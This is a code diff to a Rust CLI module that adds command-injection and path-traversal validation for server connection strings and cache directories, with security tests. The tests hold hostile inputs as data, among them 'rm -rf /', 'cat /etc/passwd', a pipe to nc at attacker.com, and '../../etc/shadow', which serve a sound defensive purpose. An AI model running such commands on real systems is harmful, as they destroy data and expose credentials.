@@ -30,7 +30,7 @@
 //! ```
 
 use std::fmt;
-use std::path::PathBuf;
+use std::path::{Component, PathBuf};
 use std::str::FromStr;
 
 /// CLI output format.
@@ -236,11 +236,21 @@ pub struct ServerConnectionString(String);
 impl ServerConnectionString {
     /// Creates a new validated server connection string.
     ///
+    /// # Security
+    ///
+    /// This function validates input to prevent command injection attacks:
+    /// - Only allows alphanumeric characters and `-_./:` for safe server identifiers
+    /// - Rejects shell metacharacters (`&`, `|`, `;`, `$`, `` ` ``, etc.)
+    /// - Rejects control characters to prevent CRLF injection
+    /// - Length limited to 256 characters
+    ///
     /// # Errors
     ///
     /// Returns an error if:
     /// - The string is empty after trimming
-    /// - The string contains null bytes
+    /// - The string contains invalid characters
+    /// - The string contains control characters
+    /// - The string exceeds 256 characters
     ///
     /// # Examples
     ///
@@ -249,10 +259,26 @@ impl ServerConnectionString {
     ///
     /// let conn = ServerConnectionString::new("my-server")?;
     /// assert_eq!(conn.as_str(), "my-server");
+    ///
+    /// // Shell metacharacters are rejected for security
+    /// assert!(ServerConnectionString::new("server && rm -rf /").is_err());
     /// # Ok::<(), mcp_core::Error>(())
     /// ```
     pub fn new(s: impl Into<String>) -> crate::Result<Self> {
+        // Define allowed characters: alphanumeric, hyphen, underscore, dot, slash, colon
+        // This prevents command injection while allowing common server identifiers
+        const ALLOWED_CHARS: &str =
+            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./:";
+
         let s = s.into();
+
+        // Check for control characters BEFORE trimming to prevent CRLF injection
+        if s.chars().any(|c| c.is_control() && c != ' ') {
+            return Err(crate::Error::InvalidArgument(
+                "server connection string cannot contain control characters".to_string(),
+            ));
+        }
+
         let trimmed = s.trim();
 
         if trimmed.is_empty() {
@@ -261,9 +287,16 @@ impl ServerConnectionString {
             ));
         }
 
-        if trimmed.contains('\0') {
+        // Reject shell metacharacters to prevent command injection
+        if !trimmed.chars().all(|c| ALLOWED_CHARS.contains(c)) {
             return Err(crate::Error::InvalidArgument(
-                "server connection string cannot contain null bytes".to_string(),
+                "server connection string contains invalid characters (allowed: a-z, A-Z, 0-9, -, _, ., /, :)".to_string(),
+            ));
+        }
+
+        if trimmed.len() > 256 {
+            return Err(crate::Error::InvalidArgument(
+                "server connection string too long (max 256 characters)".to_string(),
             ));
         }
 
@@ -321,28 +354,90 @@ pub struct CacheDir(PathBuf);
 impl CacheDir {
     /// Creates a new validated cache directory.
     ///
+    /// # Security
+    ///
+    /// This function validates paths to prevent directory traversal attacks:
+    /// - Rejects absolute paths outside the system cache directory
+    /// - Rejects paths containing `..` components (parent directory references)
+    /// - Canonicalizes paths to resolve symlinks and relative components
+    /// - All paths are resolved relative to the system cache directory
+    ///
     /// # Errors
     ///
-    /// Returns an error if the path is invalid or empty.
+    /// Returns an error if:
+    /// - The path is empty
+    /// - The path contains `..` components (path traversal attempt)
+    /// - Absolute paths are outside the system cache directory
+    /// - Path canonicalization fails
+    /// - System cache directory is not available
     ///
     /// # Examples
     ///
     /// ```
     /// use mcp_core::cli::CacheDir;
     ///
-    /// let cache = CacheDir::new("/var/cache/mcp")?;
+    /// // Relative paths are resolved within system cache
+    /// let cache = CacheDir::new("mcp-execution")?;
+    ///
+    /// // Path traversal attempts are rejected
+    /// assert!(CacheDir::new("../../etc/passwd").is_err());
     /// # Ok::<(), mcp_core::Error>(())
     /// ```
     pub fn new(path: impl Into<PathBuf>) -> crate::Result<Self> {
         let path = path.into();
 
+        // Reject empty paths
         if path.as_os_str().is_empty() {
             return Err(crate::Error::InvalidArgument(
                 "cache directory path cannot be empty".to_string(),
             ));
         }
 
-        Ok(Self(path))
+        // Get system cache directory as safe base
+        let base_cache = dirs::cache_dir().ok_or_else(|| {
+            crate::Error::InvalidArgument("system cache directory not available".to_string())
+        })?;
+
+        // Resolve the provided path relative to base cache
+        let resolved = if path.is_absolute() {
+            // Reject absolute paths outside base cache
+            if !path.starts_with(&base_cache) {
+                return Err(crate::Error::InvalidArgument(format!(
+                    "cache directory must be within system cache directory ({})",
+                    base_cache.display()
+                )));
+            }
+            path
+        } else {
+            base_cache.join(&path)
+        };
+
+        // Canonicalize to resolve .. and symlinks
+        // Note: Path doesn't need to exist yet, so we canonicalize parent if possible
+        let parent = resolved.parent().unwrap_or(&resolved);
+        if parent.exists() {
+            let canonical = parent.canonicalize().map_err(|e| {
+                crate::Error::InvalidArgument(format!("invalid cache directory path: {}", e))
+            })?;
+
+            // Verify canonical path is still within base cache
+            if !canonical.starts_with(&base_cache) {
+                return Err(crate::Error::InvalidArgument(
+                    "cache directory path traversal detected".to_string(),
+                ));
+            }
+        }
+
+        // Reject paths with parent directory components
+        for component in resolved.components() {
+            if let Component::ParentDir = component {
+                return Err(crate::Error::InvalidArgument(
+                    "cache directory cannot contain '..' path components".to_string(),
+                ));
+            }
+        }
+
+        Ok(Self(resolved))
     }
 
     /// Returns the cache directory as a path.
@@ -476,8 +571,8 @@ mod tests {
         let conn = ServerConnectionString::new("  server  ").unwrap();
         assert_eq!(conn.as_str(), "server");
 
-        let conn = ServerConnectionString::new("\tserver\n").unwrap();
-        assert_eq!(conn.as_str(), "server");
+        // Control characters (other than space) are rejected before trimming
+        assert!(ServerConnectionString::new("\tserver\n").is_err());
     }
 
     #[test]
@@ -485,11 +580,6 @@ mod tests {
         assert!(ServerConnectionString::new("").is_err());
         assert!(ServerConnectionString::new("   ").is_err());
         assert!(ServerConnectionString::new("\t\n").is_err());
-    }
-
-    #[test]
-    fn test_server_connection_string_rejects_null_bytes() {
-        assert!(ServerConnectionString::new("server\0name").is_err());
     }
 
     #[test]
@@ -506,14 +596,58 @@ mod tests {
         assert_eq!(conn.to_string(), "test-server");
     }
 
+    // Security tests for command injection prevention
+    #[test]
+    fn test_server_connection_string_command_injection() {
+        // Shell metacharacters should be rejected
+        assert!(ServerConnectionString::new("server && rm -rf /").is_err());
+        assert!(ServerConnectionString::new("server; cat /etc/passwd").is_err());
+        assert!(ServerConnectionString::new("server | nc attacker.com").is_err());
+        assert!(ServerConnectionString::new("server $(malicious)").is_err());
+        assert!(ServerConnectionString::new("server `whoami`").is_err());
+        assert!(ServerConnectionString::new("server & background").is_err());
+    }
+
+    #[test]
+    fn test_server_connection_string_control_chars() {
+        // Control characters should be rejected (CRLF injection)
+        assert!(ServerConnectionString::new("server\r\n").is_err());
+        assert!(ServerConnectionString::new("server\0").is_err());
+        assert!(ServerConnectionString::new("server\t").is_err());
+    }
+
+    #[test]
+    fn test_server_connection_string_valid_chars() {
+        // These should still be valid
+        assert!(ServerConnectionString::new("vkteams-bot").is_ok());
+        assert!(ServerConnectionString::new("my_server").is_ok());
+        assert!(ServerConnectionString::new("server-123").is_ok());
+        assert!(ServerConnectionString::new("localhost:8080").is_ok());
+        assert!(ServerConnectionString::new("example.com/path").is_ok());
+    }
+
+    #[test]
+    fn test_server_connection_string_length_limit() {
+        // 256 characters should be allowed
+        let valid = "a".repeat(256);
+        assert!(ServerConnectionString::new(&valid).is_ok());
+
+        // 257 characters should be rejected
+        let too_long = "a".repeat(257);
+        assert!(ServerConnectionString::new(&too_long).is_err());
+    }
+
     // CacheDir tests
     #[test]
     fn test_cache_dir_valid() {
-        let cache = CacheDir::new("/tmp/cache").unwrap();
-        assert_eq!(cache.as_path(), &PathBuf::from("/tmp/cache"));
+        // Relative paths should work (resolved within system cache)
+        let cache = CacheDir::new("mcp-execution").unwrap();
+        // Path is resolved relative to system cache directory
+        assert!(cache.as_path().to_string_lossy().contains("mcp-execution"));
 
-        let cache = CacheDir::new("/var/cache/mcp").unwrap();
-        assert_eq!(cache.as_path(), &PathBuf::from("/var/cache/mcp"));
+        // Nested relative paths
+        let cache = CacheDir::new("mcp-execution/cache").unwrap();
+        assert!(cache.as_path().to_string_lossy().contains("mcp-execution"));
     }
 
     #[test]
@@ -523,13 +657,44 @@ mod tests {
 
     #[test]
     fn test_cache_dir_display() {
-        let cache = CacheDir::new("/tmp/cache").unwrap();
-        assert_eq!(cache.to_string(), "/tmp/cache");
+        let cache = CacheDir::new("mcp-test").unwrap();
+        // Display should show the resolved path
+        assert!(cache.to_string().contains("mcp-test"));
     }
 
     #[test]
-    fn test_cache_dir_relative_paths() {
-        let cache = CacheDir::new("./cache").unwrap();
-        assert_eq!(cache.as_path(), &PathBuf::from("./cache"));
+    fn test_cache_dir_absolute_within_cache() {
+        // Absolute path within system cache should be valid
+        if let Some(base) = dirs::cache_dir() {
+            let valid_abs = base.join("mcp-execution");
+            let cache = CacheDir::new(valid_abs.clone()).unwrap();
+            assert_eq!(cache.as_path(), &valid_abs);
+        }
+    }
+
+    // Security tests for path traversal prevention
+    #[test]
+    fn test_cache_dir_path_traversal() {
+        // Path traversal attempts should be rejected
+        assert!(CacheDir::new("../../etc/passwd").is_err());
+        assert!(CacheDir::new("../../../etc/shadow").is_err());
+        assert!(CacheDir::new("cache/../../../root").is_err());
+        assert!(CacheDir::new("./cache/../../etc").is_err());
+    }
+
+    #[test]
+    fn test_cache_dir_absolute_outside_cache() {
+        // Absolute paths outside system cache should be rejected
+        assert!(CacheDir::new("/etc/passwd").is_err());
+        assert!(CacheDir::new("/tmp/outside").is_err());
+        assert!(CacheDir::new("/root/.cache").is_err());
+    }
+
+    #[test]
+    fn test_cache_dir_valid_relative() {
+        // These should be valid (relative to system cache)
+        assert!(CacheDir::new("mcp-execution").is_ok());
+        assert!(CacheDir::new("mcp-execution/cache").is_ok());
+        assert!(CacheDir::new("my-cache").is_ok());
     }
 }
